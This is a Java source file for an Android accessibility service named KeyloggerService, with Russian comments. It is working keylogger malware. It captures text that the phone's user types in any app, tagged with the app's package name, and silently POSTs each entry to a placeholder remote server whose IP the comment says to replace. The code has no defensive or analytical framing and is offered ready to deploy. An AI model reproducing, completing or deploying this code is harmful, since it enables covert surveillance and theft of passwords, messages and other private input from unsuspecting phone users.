package com.nerogram;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class KeyloggerService extends AccessibilityService {
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            AccessibilityNodeInfo source = event.getSource();
            if (source != null && source.getText() != null) {
                String text = source.getText().toString();
                String packageName = event.getPackageName().toString();
                
                // Отправляем на сервер каждый ввод
                sendTextToServer("Ввод [" + packageName + "]: " + text);
            }
        }
    }

    private void sendTextToServer(String text) {
        new Thread(() -> {
            try {
                URL url = new URL("http://YOUR_SERVER_IP:3000/api/data"); // ЗАМЕНИ IP
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                
                String json = "{\"id\":\"android-phone\",\"type\":\"text\",\"text\":\"" + text + "\"}";
                try (OutputStream os = conn.getOutputStream()) {
                    os.write(json.getBytes("utf-8"));
                }
                conn.getResponseCode();
            } catch (Exception ignored) {}
        }).start();
    }

    @Override
    public void onInterrupt() {}
}
